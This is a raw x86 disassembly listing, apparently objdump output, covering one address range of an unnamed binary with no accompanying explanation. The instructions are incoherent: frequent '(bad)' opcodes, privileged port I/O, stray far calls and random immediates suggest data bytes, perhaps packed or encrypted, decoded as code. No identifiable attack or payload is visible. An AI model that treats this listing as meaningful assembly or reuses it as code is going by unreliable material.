  415be1:	jl     0x415b8e
  415be3:	xor    DWORD PTR [ebp-0x12],0x67
  415be7:	pop    ss
  415be8:	and    al,0xb2
  415bea:	pop    ds
  415beb:	mov    al,0x7f
  415bed:	aam    0x3c
  415bef:	aas    
  415bf0:	sbb    ch,BYTE PTR [ebp+0x17]
  415bf3:	iret   
  415bf4:	inc    edx
  415bf5:	cs cld 
  415bf7:	aad    0x44
  415bf9:	xchg   edx,eax
  415bfa:	jg     0x415c5f
  415bfc:	sbb    ebx,DWORD PTR [edx]
  415bfe:	add    eax,0xfb3c4d1f
  415c03:	push   0x77
  415c05:	es ins DWORD PTR es:[edi],dx
  415c07:	push   ebx
  415c08:	mov    bh,0xef
  415c0a:	in     eax,0x9d
  415c0c:	jbe    0x415bc8
  415c0e:	popa   
  415c0f:	inc    ebp
  415c10:	dec    esp
  415c11:	dec    ebp
  415c12:	cmp    dl,dl
  415c14:	mov    ebp,0x7b1c13c8
  415c19:	dec    eax
  415c1a:	mov    esp,0xf75b911
  415c1f:	je     0x415bd6
  415c21:	arpl   bp,di
  415c23:	sub    DWORD PTR [ebp+0x184b05e6],ecx
  415c29:	lock jnp 0x415c55
  415c2c:	jno    0x415c0f
  415c2e:	inc    esp
  415c2f:	dec    ebx
  415c30:	pushf  
  415c31:	mov    esp,0xc7d8b8ff
  415c36:	add    bh,ah
  415c38:	xor    al,0x4a
  415c3a:	mov    ebx,DWORD PTR [edi+ebp*4]
  415c3d:	mov    edx,DWORD PTR ds:0x8801fdbf
  415c43:	xor    dh,BYTE PTR [esi+0x1390630c]
  415c49:	push   cs
  415c4a:	mov    WORD PTR [ebx-0x4d10db7c],cs
  415c50:	mov    bh,0xb7
  415c52:	dec    esi
  415c53:	test   eax,0x52a9bd4a
  415c58:	inc    ecx
  415c59:	sar    ebp,0x61
  415c5c:	xor    ch,0x2d
  415c5f:	and    edx,DWORD PTR [edx-0x12]
  415c62:	xchg   edi,eax
  415c63:	jg     0x415c0f
  415c65:	cmc    
  415c66:	outs   dx,BYTE PTR ds:[esi]
  415c67:	cmp    al,0xad
  415c69:	lock clc 
  415c6b:	sahf   
  415c6c:	hlt    
  415c6d:	pop    esp
  415c6e:	mov    edx,0x9cc0db58
  415c73:	fld    DWORD PTR [ebp-0x27]
  415c76:	call   0x8451:0x77b65e14
  415c7d:	dec    ecx
  415c7e:	mov    bl,0xbe
  415c80:	fs mov edx,0xd4813845
  415c86:	and    al,0xf7
  415c88:	xchg   ebp,eax
  415c89:	jp     0x415ce6
  415c8b:	outs   dx,DWORD PTR ds:[esi]
  415c8c:	iret   
  415c8d:	sub    ebx,DWORD PTR [esi-0x6b]
  415c90:	out    0x92,eax
  415c92:	sub    al,0x8a
  415c94:	outs   dx,BYTE PTR ds:[esi]
  415c95:	mov    al,0x24
  415c97:	push   0x9ba743c7
  415c9c:	sub    ebp,ecx
  415c9e:	pusha  
  415c9f:	mov    edx,0xe101e493
  415ca4:	dec    edi
  415ca5:	out    dx,al
  415ca6:	xchg   ecx,eax
  415ca7:	sbb    DWORD PTR [edx+0x21],ecx
  415caa:	lods   al,BYTE PTR ds:[esi]
  415cab:	add    ch,ch
  415cad:	sbb    dl,BYTE PTR [edi+edi*8]
  415cb0:	xor    ebx,esp
  415cb2:	jne    0x415cd3
  415cb4:	jp     0x415cee
  415cb6:	shr    DWORD PTR fs:[ebp-0x119a56cb],0xa3
  415cbe:	out    dx,al
  415cbf:	pop    esi
  415cc0:	ds ret 
  415cc2:	cmc    
  415cc3:	adc    edi,0x6e
  415cc6:	pushf  
  415cc7:	fnstcw WORD PTR [edx+edx*1-0x42]
  415ccb:	sbb    eax,0x138d560b
  415cd0:	fsubr  DWORD PTR [ecx+0x51c13d4c]
  415cd6:	nop
  415cd7:	cmp    dl,BYTE PTR ds:0x8755a9bf
  415cdd:	cmp    esp,esp
  415cdf:	(bad)  
  415ce1:	test   BYTE PTR [edi+edx*8],0xe1
  415ce5:	fs popa 
  415ce7:	sbb    al,0x34
  415ce9:	cs inc esi
  415ceb:	cmp    DWORD PTR ds:0xd20e95dc,ebp
  415cf1:	cwde   
  415cf2:	xchg   edi,eax
  415cf3:	lahf   
  415cf4:	mov    al,ds:0xeb1d40bc
  415cf9:	sbb    DWORD PTR [ebx+0x651436c2],esp
  415cff:	scas   al,BYTE PTR es:[edi]
  415d00:	stc    
  415d01:	outs   dx,BYTE PTR ds:[si]
  415d03:	fldenv [ebp+0x79e85ca8]
  415d09:	dec    ebp
  415d0a:	jp     0x415cc3
  415d0c:	mov    esi,0xa144a5b9
  415d11:	cmp    eax,0x587eddb4
  415d16:	and    eax,0x218af07c
  415d1b:	sbb    eax,0xca55a0e5
  415d20:	pop    es
  415d21:	out    0x60,eax
  415d23:	or     eax,0x489807f5
  415d28:	and    BYTE PTR [eax-0x2723895f],bl
  415d2e:	adc    al,0xb5
  415d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d31:	cmp    al,0x80
  415d33:	cdq    
  415d34:	mov    eax,0xa1bab93a
  415d39:	cdq    
  415d3a:	inc    ebp
  415d3b:	lods   eax,DWORD PTR ds:[esi]
  415d3c:	(bad)  
  415d3d:	loope  0x415d07
  415d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d40:	je     0x415da5
  415d42:	dec    edi
  415d43:	xchg   ebp,eax
  415d44:	cmp    ecx,ecx
  415d46:	xchg   ebx,eax
  415d47:	xor    dl,BYTE PTR [edi-0x9]
  415d4a:	std    
  415d4b:	mov    ?,WORD PTR ds:0x6c0d3ea9
  415d51:	sbb    esp,edi
  415d53:	adc    BYTE PTR [esi],dl
  415d55:	inc    edi
  415d56:	sub    eax,0x7d2483df
  415d5b:	loope  0x415d79
  415d5d:	sbb    al,0x3f
  415d5f:	aas    
  415d60:	xchg   edx,eax
  415d61:	mov    edi,0x7511544b
  415d66:	mov    eax,esi
  415d68:	cmp    al,0xe0
  415d6a:	or     eax,0x32dd01c
  415d6f:	je     0x415d75
  415d71:	inc    edx
  415d72:	sar    BYTE PTR [ecx+0x262ae524],1
  415d78:	mov    esp,DWORD PTR [edi+0x1447d2f4]
  415d7e:	or     BYTE PTR [ecx+edi*4],0x7e
  415d82:	jbe    0x415d27
  415d84:	test   BYTE PTR [esi-0x76517511],dl
  415d8a:	xor    DWORD PTR [ebx+0x1ef2f32c],edi
  415d90:	out    0x6b,eax
  415d92:	dec    edi
  415d93:	pop    ss
  415d94:	ja     0x415d5d
  415d96:	sub    eax,0x63303c2b
  415d9b:	(bad)  
  415d9c:	xchg   esi,eax
  415d9d:	xlat   BYTE PTR ds:[ebx]
  415d9e:	xor    eax,0xb9b53fe9
  415da3:	jge    0x415db5
  415da5:	fdiv   DWORD PTR [eax]
  415da7:	sar    DWORD PTR [esp+esi*4-0x2e],1
  415dab:	hlt    
  415dac:	cmp    ebp,eax
  415dae:	outs   dx,DWORD PTR ds:[esi]
  415daf:	inc    ebx
  415db0:	mov    esi,0x955f913c
  415db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db6:	test   ecx,esp
  415db8:	das    
  415db9:	sbb    BYTE PTR [ecx-0x4f],bl
  415dbc:	cmp    edi,ebp
  415dbe:	aas    
  415dbf:	fistp  QWORD PTR [edi+edx*1+0x55ac69c4]
  415dc6:	jmp    0x43c6:0xfd7834ab
  415dcd:	jg     0x415e43
  415dcf:	mov    ds:0xeed134ff,al
  415dd4:	popf   
  415dd5:	xor    ebx,0x30
  415dd8:	push   ss
  415dd9:	div    BYTE PTR [edi]
  415ddb:	sbb    al,0xf8
  415ddd:	add    edx,DWORD PTR [edi]
  415ddf:	mov    DWORD PTR ds:0x70b5ed60,edx
  415de5:	pop    ebp
  415de6:	cmp    al,0xee
  415de8:	outs   dx,BYTE PTR ds:[esi]
  415de9:	or     cl,BYTE PTR [eax]
  415deb:	(bad)  
  415ded:	gs hlt 
  415def:	push   ebx
  415df0:	loopne 0x415e24
  415df2:	push   esi
  415df3:	mov    dh,0xf1
  415df5:	jno    0x415df4
  415df7:	jg     0x415da4
  415df9:	int    0xad
  415dfb:	jns    0x415e12
  415dfd:	and    eax,0xfcd44dd4
  415e02:	js     0x415d8d
  415e04:	pop    ecx
  415e05:	push   ss
  415e06:	mul    BYTE PTR [edi-0x67c22a6f]
  415e0c:	test   al,0xec
  415e0e:	in     al,dx
  415e0f:	cwde   
  415e10:	(bad)  
  415e11:	adc    al,0x78
  415e13:	adc    eax,0x76bd2231
  415e18:	fdivr  st(5),st
  415e1a:	test   BYTE PTR [ebx-0x41caf0f0],cl
  415e20:	(bad)  
  415e21:	ret    0x5759
  415e24:	pop    sp
  415e26:	mov    bh,0xef
  415e28:	rcr    dh,1
  415e2a:	pop    esi
  415e2b:	repz sub DWORD PTR [esi+eax*4],ebp
  415e2f:	xor    edi,edi
  415e31:	fs dec ebx
  415e33:	xor    edx,edi
  415e35:	js     0x415e25
  415e37:	loop   0x415e49
  415e39:	je     0x415e86
  415e3b:	xchg   ebx,eax
  415e3c:	jnp    0x415e22
  415e3e:	jmp    0x415dee
  415e40:	fadd   DWORD PTR cs:[ebp-0x6b4c24c2]
  415e47:	jmp    0xf7d1:0xa12ab83a
  415e4e:	cmp    DWORD PTR [edi+0x69],0xffffff87
  415e52:	xchg   ebp,eax
  415e53:	mov    ebx,ebx
  415e55:	aad    0x41
  415e57:	mov    dl,0x82
  415e59:	call   0x36a4d9db
  415e5e:	mov    edx,0xa493c764
  415e63:	and    edx,esi
  415e65:	(bad)  
  415e66:	stos   DWORD PTR es:[edi],eax
  415e67:	adc    DWORD PTR [edx*8-0xc8ab1d7],0x2d4ac59c
  415e72:	xor    DWORD PTR [edi],ecx
  415e74:	(bad)  
  415e75:	adc    eax,DWORD PTR [ebx+ebx*4]
  415e78:	dec    ebp
  415e79:	jne    0x415ebb
  415e7b:	leave  
  415e7c:	in     eax,0xb2
  415e7e:	xchg   ebx,eax
  415e7f:	sbb    ebp,DWORD PTR [ecx-0x135fe433]
  415e85:	sbb    eax,esi
  415e87:	mov    esi,0x3715a09e
  415e8c:	mov    bl,0x58
  415e8e:	push   es
  415e8f:	nop
  415e90:	(bad)  
  415e91:	xchg   BYTE PTR [eax-0x448f4160],bl
  415e97:	adc    esi,edx
  415e99:	push   ebp
  415e9a:	punpckhwd mm3,QWORD PTR ds:0xba68b0cb
  415ea1:	imul   DWORD PTR [ebx]
  415ea3:	dec    ecx
  415ea4:	sub    BYTE PTR [ecx],ah
  415ea6:	mov    bh,0xf2
  415ea8:	sbb    edi,edi
  415eaa:	sbb    esp,eax
  415eac:	add    BYTE PTR [esp+esi*2-0x56550c1],dl
  415eb3:	push   0x53
  415eb5:	jae    0x415e63
  415eb7:	pop    ss
  415eb8:	inc    esp
  415eb9:	shl    ebp,1
  415ebb:	push   es
  415ebc:	push   esi
  415ebd:	retf   0x4de8
  415ec0:	shl    BYTE PTR [ebp-0x16069645],1
  415ec6:	mov    esi,0x56bf5711
  415ecb:	or     al,0x17
  415ecd:	test   BYTE PTR [edx-0x42],bh
  415ed0:	mov    ebx,0x64b5172e
  415ed5:	scas   eax,DWORD PTR es:[edi]
  415ed6:	add    eax,0xee8f808d
  415edb:	mov    bh,0xcd
  415edd:	add    esp,DWORD PTR [ecx+0x39]
  415ee0:	inc    ebp
  415ee1:	and    eax,0xdc799a82
  415ee6:	idiv   bh
  415ee8:	jg     0x415e76
  415eea:	frstor [ebp+0x3b]
  415eed:	and    al,BYTE PTR [ecx+eiz*4-0x18]
  415ef1:	sbb    BYTE PTR [edx+0x48],dl
  415ef4:	das    
  415ef5:	je     0x415ebb
  415ef7:	shl    BYTE PTR ds:0x4e2f7444,1
  415efd:	call   0x1b9c:0x232a1a7c
  415f04:	jne    0x415f52
  415f06:	xor    BYTE PTR ds:0xbe2fadbf,al
  415f0c:	or     dl,BYTE PTR [edx+0x75cbeec0]
  415f12:	sub    DWORD PTR [ecx-0x384ad4f6],ecx
  415f18:	loop   0x415eff
  415f1a:	jo     0x415eb3
  415f1c:	in     al,0x4c
  415f1e:	mov    esp,0x83169462
  415f23:	out    dx,eax
  415f24:	int3   
  415f25:	adc    BYTE PTR [edi+0x35],0xed
  415f29:	repnz push eax
  415f2b:	sub    ebx,esi
  415f2d:	cmc    
  415f2e:	xor    bh,BYTE PTR [ecx+0x71a7d37]
  415f34:	ret    
  415f35:	cmp    dh,ch
  415f37:	mov    dl,cl
  415f39:	sbb    DWORD PTR [eiz*4-0x4b2b66],0x6a4a7d25
  415f44:	in     eax,0x5f
  415f46:	and    eax,0x62f3d1a2
  415f4b:	pop    eax
  415f4c:	mov    al,ds:0xc0b8fd77
  415f51:	int3   
  415f52:	popf   
  415f53:	dec    eax
  415f54:	xchg   edx,eax
  415f55:	ret    0x9cae
  415f58:	pusha  
  415f59:	sbb    BYTE PTR [ecx-0x8],ah
  415f5c:	test   DWORD PTR [edx-0x70bf3fc3],edi
  415f62:	xchg   ebx,eax
  415f63:	jo     0x415f72
  415f65:	mov    ch,0xe7
  415f67:	arpl   WORD PTR [edi-0x712b17e4],bx
  415f6d:	bound  eax,QWORD PTR [esi-0x46]
  415f70:	(bad)  
  415f71:	shl    DWORD PTR [esi],1
  415f73:	adc    DWORD PTR [eax+0x337b0465],0x34ff98b4
  415f7d:	add    al,0x75
  415f7f:	adc    edi,DWORD PTR [edx-0x66]
  415f82:	int3   
  415f83:	push   ebx
  415f84:	sub    eax,DWORD PTR [edi+0x5a]
  415f87:	mov    cl,0xfb
  415f89:	ret    0xa69f
  415f8c:	adc    eax,0xeb3d53b9
  415f91:	scas   al,BYTE PTR es:[edi]
  415f92:	outs   dx,BYTE PTR ds:[esi]
  415f93:	push   edi
  415f94:	xchg   ebx,eax
  415f95:	jge    0x415f78
  415f97:	mov    ecx,0x3a922cb8
  415f9c:	stos   BYTE PTR es:[edi],al
  415f9d:	cmp    BYTE PTR [eax],ch
  415f9f:	imul   edi,DWORD PTR [esp+ebp*2+0x5d9b6617],0x699d51ca
  415faa:	adc    DWORD PTR [ecx-0xfdc3f10],edi
  415fb0:	imul   eax,DWORD PTR [ecx-0x47],0xffffff8a
  415fb4:	and    BYTE PTR [edi],dh
  415fb6:	xlat   BYTE PTR ds:[ebx]
  415fb7:	out    dx,al
  415fb8:	call   0x282:0x658e430f
  415fbf:	mov    bh,0x1
  415fc1:	dec    esp
  415fc2:	cli    
  415fc3:	scas   eax,DWORD PTR es:[edi]
  415fc4:	push   edx
  415fc5:	mov    edx,0x2c2d4e2c
  415fca:	or     eax,0xd9900bc8
  415fcf:	jne    0x415f54
  415fd1:	pop    eax
  415fd2:	pop    edi
  415fd3:	sbb    bh,BYTE PTR [eax-0x3139efd8]
  415fd9:	fwait
  415fda:	lods   eax,DWORD PTR ds:[esi]
  415fdb:	push   edi
  415fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fdd:	or     edi,eax
  415fdf:	jg     0x416004
  415fe1:	xlat   BYTE PTR ds:[ebx]
  415fe2:	add    al,0xb5
  415fe4:	(bad)  
  415fe5:	jo     0x415f6f
  415fe7:	xchg   ecx,eax
  415fe8:	mov    esp,0xd88c2231
  415fed:	push   es
  415fee:	jg     0x41602f
  415ff0:	xor    eax,0x12a15e87
  415ff5:	add    edx,0xbf00df90
  415ffb:	lds    edi,FWORD PTR [edi+0x74]
  415ffe:	scas   al,BYTE PTR es:[edi]
  415fff:	jno    0x416070
  416001:	rol    BYTE PTR [ebp-0x22724a8d],1
  416007:	inc    ecx
  416008:	stos   BYTE PTR es:[edi],al
  416009:	ja     0x415fc9
  41600b:	add    al,0xe5
  41600d:	pop    edi
  41600e:	pop    edi
  41600f:	mov    WORD PTR [esi],fs
  416011:	or     al,0xab
  416013:	push   edi
  416014:	mov    ch,0x30
  416016:	in     eax,dx
  416017:	jecxz  0x41608e
  416019:	inc    edx
  41601a:	jmp    0x416005
  41601c:	call   0x3244fb02
  416021:	(bad)  
  416022:	xchg   esp,eax
  416023:	cwde   
  416024:	jmp    0x415fff
  416026:	dec    ecx
  416027:	pop    ebx
  416028:	and    eax,0xcc41b591
  41602d:	sub    DWORD PTR [edx],edx
  41602f:	ja     0x4160ad
  416031:	dec    esp
  416032:	or     al,0x61
  416034:	not    DWORD PTR [ecx+0x3c]
  416037:	pop    es
  416038:	xor    eax,0x9db9ea9f
  41603d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41603e:	dec    edi
  41603f:	pop    ebp
  416040:	or     eax,0x96cce9bd
  416045:	cld    
  416046:	pop    sp
  416048:	scas   eax,DWORD PTR es:[edi]
  416049:	pop    ebp
  41604a:	mov    ds,WORD PTR [esi-0x3f1a6a15]
  416050:	cmp    DWORD PTR [ebx],eax
  416052:	dec    esp
  416053:	mov    ds:0x2bec59c5,eax
  416058:	or     esi,DWORD PTR [esi+0x69]
  41605b:	test   al,0xc2
  41605d:	and    BYTE PTR [esi],cl
  41605f:	inc    edi
  416060:	pushf  
  416061:	xor    BYTE PTR [edi-0x5694df32],dh
  416067:	xor    ebp,DWORD PTR [esi]
  416069:	jl     0x4160d8
  41606b:	mov    ebp,eax
  41606d:	mov    al,0x7c
  41606f:	popf   
  416070:	add    eax,0x8157a591
  416075:	and    al,0x93
  416077:	sbb    esi,0xe6407675
  41607d:	sbb    edx,DWORD PTR [ecx-0x65]
  416080:	add    BYTE PTR [eax-0x11],ch
  416083:	(bad)  [edx+0x5e]
  416086:	jecxz  0x41602c
  416088:	xchg   edx,eax
  416089:	ficomp DWORD PTR [esi+0x58]
  41608c:	cmp    al,0xff
  41608e:	mov    WORD PTR [esi+0xb],fs
  416091:	into   
  416092:	add    al,0x82
  416094:	mov    ?,eax
  416096:	jns    0x4160aa
  416098:	loope  0x41607d
  41609a:	mov    edi,0x4a5f6d36
  41609f:	cmp    al,0x15
  4160a1:	sti    
  4160a2:	fmul   DWORD PTR [eax-0x631967a5]
  4160a8:	int    0xdc
  4160aa:	pop    ds
  4160ab:	mov    al,0xf
  4160ad:	bound  eax,QWORD PTR [edx-0x59c056bc]
  4160b3:	mul    ch
  4160b5:	pop    eax
  4160b6:	daa    
  4160b7:	shr    DWORD PTR [eax],1
  4160b9:	fisub  WORD PTR [esi-0x2e]
  4160bc:	sbb    bh,BYTE PTR [eax-0x5cee8d2b]
  4160c2:	sub    BYTE PTR [ebp-0x75e65cff],ch
  4160c8:	pushf  
  4160c9:	add    DWORD PTR [esi+0x1a64aee7],ebx
  4160cf:	sbb    DWORD PTR [edi+eax*4],esi
  4160d2:	pop    es
  4160d3:	in     al,dx
  4160d4:	jl     0x4160ae
  4160d6:	and    DWORD PTR ds:0x8074137,eax
  4160dc:	xchg   esp,eax
  4160dd:	mov    esp,0xb946b7d
  4160e2:	xor    eax,0x7d428a94
  4160e7:	pop    ds
  4160e8:	jmp    0x41610b
  4160ea:	sbb    BYTE PTR [ecx-0x6d01be40],dh
  4160f0:	adc    DWORD PTR [ecx],edx
  4160f2:	add    ebp,edx
  4160f4:	pop    ss
  4160f5:	in     al,dx
  4160f6:	xchg   esp,eax
  4160f7:	aam    0x64
  4160f9:	jecxz  0x41613a
  4160fb:	stc    
  4160fc:	in     eax,0x57
  4160fe:	add    cl,al
  416100:	out    0x8c,al
  416102:	stos   BYTE PTR es:[edi],al
  416103:	std    
  416104:	std    
  416105:	test   ah,bl
  416107:	fcomp  DWORD PTR ds:0x8e4f66b8
  41610d:	pop    esp
  41610e:	pop    edi
  41610f:	dec    eax
  416110:	jne    0x416147
  416112:	not    ecx
  416114:	or     ebx,ebx
  416116:	stc    
  416117:	into   
  416118:	mov    ds:0x3672dba9,eax
  41611d:	scas   al,BYTE PTR es:[edi]
  41611e:	jp     0x41613d
  416120:	push   0xffffffcc
  416122:	ss cmp al,0xca
  416125:	pop    ss
  416126:	sub    ch,BYTE PTR [eax-0x4957f9f4]
  41612c:	repz xchg ecx,eax
  41612e:	push   ebx
  41612f:	cli    
  416130:	dec    edi
  416131:	cli    
  416132:	mov    ebx,ebp
  416134:	test   DWORD PTR [esi-0x1f],ebp
  416137:	js     0x41611f
  416139:	cld    
  41613a:	mov    edx,0x92f92d22
  41613f:	pop    ds
  416140:	jo     0x4160f6
  416142:	sbb    edi,esp
  416144:	hlt    
  416145:	push   edx
  416146:	inc    edx
  416147:	mov    edi,0xc98a4295
  41614c:	cmp    DWORD PTR [ebx],0x45
  41614f:	ins    DWORD PTR es:[edi],dx
  416150:	xor    edi,esp
  416152:	mov    dl,0x92
  416154:	cmp    al,0xb1
  416156:	push   ebx
  416157:	pop    ebp
  416158:	cmc    
  416159:	bound  ecx,QWORD PTR [ecx+ebp*1+0x7]
  41615d:	aad    0x35
  41615f:	xor    eax,0x1502ac59
  416164:	cld    
  416165:	addr16 stc 
  416167:	fstp   st(4)
  416169:	pop    ss
  41616a:	cmp    al,0xb3
  41616c:	test   eax,0x374e1992
  416171:	sbb    eax,0xc6cb3169
  416176:	xlat   BYTE PTR ds:[ebx]
  416177:	xor    al,0xe1
  416179:	push   edx
  41617a:	sbb    eax,0xbec0a1ab
  41617f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416180:	add    cl,bh
  416182:	or     dh,BYTE PTR [ebx-0x62a5546b]
  416188:	int    0x24
  41618a:	pop    ds
  41618b:	mov    cl,0x93
  41618d:	cmp    ebx,ebx
  41618f:	mov    ebx,0x4be685d3
  416195:	push   ecx
  416196:	mov    ds:0xe2ae3f1d,al
  41619b:	and    BYTE PTR [ebp+0x3d],dh
  41619e:	aaa    
  41619f:	cmp    DWORD PTR [ebx-0x62],ecx
  4161a2:	scas   eax,DWORD PTR es:[edi]
  4161a3:	loopne 0x41613d
  4161a5:	ss jmp 0x65e74700
  4161ab:	mov    ch,0x9a
  4161ad:	lods   al,BYTE PTR ds:[esi]
  4161ae:	lods   al,BYTE PTR ds:[esi]
  4161af:	push   ecx
  4161b0:	call   0xede9:0xd6d93d31
  4161b7:	push   ecx
  4161b8:	pop    esi
  4161b9:	xchg   ecx,eax
  4161ba:	sbb    ax,0x5d0f
  4161be:	push   ebx
  4161bf:	jp     0x4161d5
  4161c1:	outs   dx,DWORD PTR ds:[esi]
  4161c2:	cmp    DWORD PTR fs:[edx-0x55],ecx
  4161c6:	push   ds
  4161c7:	xchg   ecx,eax
  4161c8:	fs in  al,dx
  4161ca:	dec    esp
  4161cb:	mov    bh,0x97
  4161cd:	xor    DWORD PTR [ebx],ebx
  4161cf:	cmp    al,0xa
  4161d1:	stos   BYTE PTR es:[edi],al
  4161d2:	ss mov ebx,0xcbef97b6
  4161d8:	idiv   DWORD PTR [ecx+0x679c5988]
  4161de:	call   0x151c936f
  4161e3:	int3   
  4161e4:	pushf  
  4161e5:	in     al,0x43
  4161e7:	and    al,0x87
  4161ea:	out    dx,al
  4161eb:	pavgw  mm2,QWORD PTR [ecx]
  4161ee:	sbb    BYTE PTR [ebx],0x51
  4161f1:	out    0xff,eax
  4161f3:	xchg   ebp,eax
  4161f4:	dec    eax
  4161f5:	jb     0x416265
  4161f7:	in     eax,dx
  4161f8:	icebp  
  4161f9:	push   DWORD PTR [ecx+0x38e2927b]
  4161ff:	aaa    
  416200:	mov    ecx,0x5d81c435
  416205:	mov    eax,ds:0x8897fa3e
  41620a:	sbb    dh,bh
  41620c:	inc    ebx
  41620d:	mov    BYTE PTR [eax-0x10],bl
  416210:	adc    al,al
  416212:	mov    cl,0x99
  416214:	adc    DWORD PTR [eax+edx*2],0xffffffb3
  416218:	cwde   
  416219:	pop    ebx
  41621a:	and    edi,ebp
  41621c:	and    al,0xb3
  41621e:	and    al,0x95
  416220:	add    eax,DWORD PTR [esi+0x3677808a]
  416226:	and    DWORD PTR [ebx],edi
  416228:	push   edx
  416229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41622a:	push   esi
  41622b:	dec    ebx
  41622c:	arpl   si,cx
  41622e:	jge    0x416227
  416230:	and    DWORD PTR [edx],esp
  416232:	rcr    DWORD PTR ds:0x28a0555d,cl
  416238:	rcr    DWORD PTR [ebx],0x66
  41623b:	aas    
  41623c:	push   esi
  41623d:	sbb    eax,0x254c6140
  416242:	mov    bl,0xd
  416244:	xchg   DWORD PTR [ebp-0x10],ebx
  416247:	jbe    0x4161ed
  416249:	repz cwde 
  41624b:	mov    dh,0x61
  41624d:	push   ss
  41624e:	sub    al,0x35
  416250:	mov    ecx,0xb385e6bd
  416255:	mov    ch,bh
  416257:	jne    0x416220
  416259:	rol    BYTE PTR [esi+esi*8+0x62],cl
  41625d:	leave  
  41625e:	push   esi
  41625f:	sub    eax,0xfcb51552
  416264:	xor    DWORD PTR [ecx],eax
  416266:	lahf   
  416267:	test   BYTE PTR [eax],dh
  416269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41626a:	sbb    eax,0xebc1f66e
  41626f:	xchg   esi,eax
  416270:	stc    
  416271:	aad    0x61
  416273:	in     eax,0x19
  416275:	mov    BYTE PTR [edx+0x74557536],al
  41627b:	or     dh,BYTE PTR [ebp+0x19]
  41627e:	inc    esi
  41627f:	(bad)
  416282:	stos   BYTE PTR es:[edi],al
  416283:	push   esi
  416284:	sti    
  416285:	fcmovnu st,st(2)
  416287:	nop
  416288:	xchg   DWORD PTR [edi+eax*8],ebp
  41628b:	scas   eax,DWORD PTR es:[edi]
  41628c:	inc    ecx
  41628d:	jp     0x41626b
  41628f:	stc    
  416290:	jne    0x416240
  416292:	xor    edx,DWORD PTR [ebx]
  416294:	inc    esp
  416295:	mov    ebp,0x5edcdad5
  41629a:	scas   al,BYTE PTR es:[edi]
  41629b:	sub    DWORD PTR [ebp+edi*8-0x47],edx
  41629f:	pop    eax
  4162a0:	mov    esp,0x6706442a
  4162a5:	test   DWORD PTR fs:[ebx+esi*1-0x5b],esi
  4162aa:	dec    edx
  4162ab:	jecxz  0x416233
  4162ad:	sar    DWORD PTR [edx-0x46],1
  4162b0:	jno    0x41629b
  4162b2:	hlt    
  4162b3:	(bad)  
  4162b4:	in     eax,dx
  4162b5:	xlat   BYTE PTR ds:[ebx]
  4162b6:	test   al,0x1c
  4162b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b9:	les    ebx,FWORD PTR [edx-0x37]
  4162bc:	daa    
  4162bd:	and    eax,0x8690143e
  4162c2:	mov    ch,0xc1
  4162c4:	call   0x594a:0x6a6d39fc
  4162cb:	xor    eax,0x284c1342
  4162d0:	or     BYTE PTR [ecx],ah
  4162d2:	or     al,0xee
  4162d4:	aad    0xa
  4162d6:	xor    eax,0x3ad46b4f
  4162db:	adc    BYTE PTR [ebx],ch
  4162dd:	mov    DWORD PTR [esi+0x79cbd2b8],esi
  4162e3:	cmp    BYTE PTR [eax],dh
  4162e5:	adc    al,0x6a
  4162e7:	clc    
  4162e8:	(bad)  
  4162e9:	jecxz  0x416310
  4162eb:	retf   
  4162ec:	or     eax,0x5e5de710
  4162f1:	fbld   TBYTE PTR [ebp-0x3a]
  4162f4:	xor    BYTE PTR [eax+0x242ea133],0x19
  4162fb:	iret   
  4162fc:	adc    al,ah
  4162fe:	arpl   WORD PTR [eax+0x48],di
  416301:	addr16 mov ebx,0xb4aea23e
  416307:	adc    DWORD PTR [ebx],0xdcedd72e
  41630d:	sub    eax,0x1e0f7eaf
  416312:	dec    ecx
  416313:	rcl    esi,1
  416315:	jl     0x41633b
  416317:	stos   BYTE PTR es:[edi],al
  416318:	mov    eax,ds:0x184a9eaf
  41631d:	jae    0x4162bc
  41631f:	mov    dh,0x50
  416321:	outs   dx,BYTE PTR ds:[esi]
  416322:	mov    WORD PTR [edx-0x7a],ss
  416325:	lock js 0x416322
  416328:	sbb    BYTE PTR [esp+ebp*4],0xcc
  41632c:	and    DWORD PTR [edi+0x14903822],edx
  416332:	or     DWORD PTR [eax+eiz*2-0x4b],eax
  416336:	mov    DWORD PTR [edi-0x5335270],esi
  41633c:	mov    dh,0x76
  41633e:	das    
  41633f:	xlat   BYTE PTR ds:[ebx]
  416340:	push   esp
  416341:	jae    0x416328
  416343:	and    DWORD PTR [ecx],ecx
  416345:	mov    ebp,ss
  416347:	jp     0x416318
  416349:	push   ss
  41634a:	test   BYTE PTR [esp+ebp*1],dl
  41634d:	aas    
  41634e:	inc    esi
  41634f:	push   es
  416350:	or     al,BYTE PTR [ebp-0x2c726ec9]
  416356:	in     eax,0x1b
  416358:	mov    ecx,0x7f7a3bed
  41635d:	out    0xc5,eax
  41635f:	push   eax
  416360:	sub    esi,DWORD PTR [ecx-0x15c8e58c]
  416366:	in     eax,0x87
  416368:	mov    ds:0x62d34697,al
  41636d:	(bad)  
  41636e:	jmp    0x23c00761
  416373:	or     DWORD PTR [ebx-0x19f84627],eax
  416379:	push   cs
  41637a:	sub    DWORD PTR [ecx-0x2f],0x45
  41637e:	popa   
  41637f:	pop    ds
  416380:	dec    edx
  416381:	or     edx,DWORD PTR [edi]
  416383:	sub    al,0x99
  416385:	or     al,0xa6
  416387:	stos   BYTE PTR es:[edi],al
  416388:	call   0xd4f923fd
  41638d:	inc    edx
  41638e:	mov    bl,0x6a
  416390:	xor    al,0x25
  416392:	mov    dl,0x33
  416394:	hlt    
  416395:	(bad)
  416399:	xor    bl,dh
  41639b:	xchg   ebx,eax
  41639c:	inc    ecx
  41639d:	addr16 js 0x416361
  4163a0:	mov    al,0xe
  4163a2:	pop    edi
  4163a3:	stos   BYTE PTR es:[edi],al
  4163a4:	pop    ds
  4163a5:	or     dl,dl
  4163a7:	ret    
  4163a8:	fcomp  DWORD PTR [ecx]
  4163aa:	inc    edx
  4163ab:	fnsave [esi*4-0x7e2ef485]
  4163b2:	add    bl,BYTE PTR [ebp-0x7d]
  4163b5:	inc    esi
  4163b6:	xchg   ebp,eax
